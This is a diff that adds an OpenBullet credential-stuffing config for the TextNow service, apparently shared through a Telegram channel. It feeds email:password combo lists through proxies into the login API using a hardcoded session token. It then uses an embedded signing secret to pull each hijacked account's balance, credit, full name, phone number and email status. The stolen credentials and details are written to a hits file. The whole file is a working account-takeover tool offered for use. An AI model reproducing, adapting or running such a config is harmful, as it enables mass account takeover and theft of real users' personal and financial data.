@@ -1,0 +1,128 @@
+[SETTINGS]
+{
+  "Name": "Text Now",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-16T18:19:29.607586+04:30",
+  "AdditionalInfo": "Telegram Channel: T.me/BruteForce| CPM: 500_1500 | Full Capture: Balance / Premium / Number / Email Verifyed and ... | Save Hits with Capture Text File on Open Bullet Root Folder (Text Now Hits.txt) open with notepad++ |",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.textnow.me/api2.0/sessions?client_type=TN_IOS_FREE&idfa=6C892B66-4F28-4E8B-8071-4D460D81A0BF&idfv=F7BA5474-C2FA-4242-A81A-60E659E31429" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember\":true,\"system_version\":\"13.3.1\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.textnow.me" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-TN-Integrity-Session: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfYXR0ZXN0ZWQiOnRydWUsImRldmljZV9pZCI6IjZDODkyQjY2LTRGMjgtNEU4Qi04MDcxLTRENDYwRDgxQTBCRiIsImVsaWdpYmxlX2Zvcl9hZHMiOnRydWUsImV4cCI6MTU5NTA3OTc3MywiaWF0IjoxNTk0OTA2OTczLCJpc3MiOiJ0bi1pbnRlZ3JpdHktc2VydmljZSIsInN1YiI6InRuLWludGVncml0eS1zZXNzaW9uIn0.wLEZOXQkWT44IeRha2L8r1UmXkhwRbU4pSJj_zrS6mE" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: TextNow/20.14.1 (iPhone8,4; iOS 13.3.1; Scale/2.00)" 
+  HEADER "Content-Length: 95" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "INVALID_PASSWORD" 
+    KEY "PASSWORD_UNSET" 
+  KEYCHAIN Retry OR 
+    KEY "SERVICE_UNAVAILABLE" 
+  KEYCHAIN Success OR 
+    KEY "username" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "USER_NOT_ALLOWED" 
+
+#username PARSE "<SOURCE>" JSON "username" -> CAP "username" 
+
+#id PARSE "<SOURCE>" JSON "id" -> VAR "id" 
+
+#H2 FUNCTION Hash MD5 "f8ab2ceca9163724b6d126aea9620339GETusers/<username>/wallet?client_type=TN_ANDROID&client_id=<id>" -> VAR "H2" 
+
+#Wallet REQUEST GET "https://api.textnow.me/api2.0/users/<username>/wallet?client_type=TN_ANDROID&client_id=<id>&signature=<H2>" 
+  
+  HEADER "User-Agent: TextNow/20.14.1 (iPhone8,4; iOS 13.3.1; Scale/2.00)" 
+
+#KOS PARSE "<SOURCE>" JSON "textnow_credit" -> VAR "KOS" 
+
+#KON FUNCTION Compute "<KOS>/100" -> VAR "KON" 
+
+#Textnow_Credit FUNCTION Constant "<KON>$" -> CAP "Textnow Credit" 
+
+#KI PARSE "<SOURCE>" JSON "account_balance" -> VAR "KI" 
+
+#KIR PARSE "<SOURCE>" JSON "currency" -> VAR "KIR" 
+
+#Account_Balance FUNCTION Constant "<KI> <KIR>" -> CAP "Account Balance" 
+
+#H3 FUNCTION Hash MD5 "f8ab2ceca9163724b6d126aea9620339GETusers/<username>?client_type=TN_ANDROID&client_id=<id>" -> VAR "H3" 
+
+#Profile REQUEST GET "https://api.textnow.me/api2.0/users/<username>?client_type=TN_ANDROID&client_id=<id>&signature=<H3>" 
+  
+  HEADER "User-Agent: TextNow/20.14.1 (iPhone8,4; iOS 13.3.1; Scale/2.00)" 
+
+#Full_Name PARSE "<SOURCE>" REGEX "\"first_name\":\"(.*?)\",\"last_name\":\"(.*?)\"" "[1] [2]" -> CAP "Full Name" 
+
+#Credits PARSE "<SOURCE>" JSON "credits" -> CAP "Credits" 
+
+#Phone_Number PARSE "<SOURCE>" LR "\"phone_number\":\"" "\"" -> CAP "Number" 
+
+#Last_Login PARSE "<SOURCE>" LR "\"phone_expiry\":\"" "\"" -> CAP "Last Login" 
+
+#Premium_Calling PARSE "<SOURCE>" LR "\"premium_calling\":" "," -> CAP "Premium Calling" 
+
+#KUN PARSE "<SOURCE>" JSON "email_verified" -> VAR "KUN" 
+
+#Email_Verified FUNCTION Translate 
+  KEY "1" VALUE "Yes" 
+  KEY "0" VALUE "No" 
+  "<KUN>" -> CAP "Email Verified" 
+
+#TTTT FUNCTION Constant " @BruteForce" -> CAP "Telegram Channel:" 
+
+!KEYCHECK BanOnToCheck=FALSE 
+!  KEYCHAIN Custom "CUSTOM" OR 
+!    KEY "<KUN>" Contains "1" 
+
+#Save UTILITY File "Text Now Hits.txt" AppendLines "<<<<<<Account>>>>>>\\nCombo: <USER>:<PASS>\\nUser: <USER>\\nPass: <PASS>\\n<<<<<<INFO>>>>>>\\nEmail Verified: <Email Verified>\\nTextnow Credit: <Textnow Credit>\\nAccount Balance: <Account Balance>\\nPremium Calling: <Premium Calling>\\nCredits: <Credits>\\nNumber: <Number>\\nLast Login: <Last Login>\\nUserName: <username>\\nFull Name: <Full Name>\\n\\nTelegram Channel: @BruteForce\\n============================================" -> VAR "Save" 
+
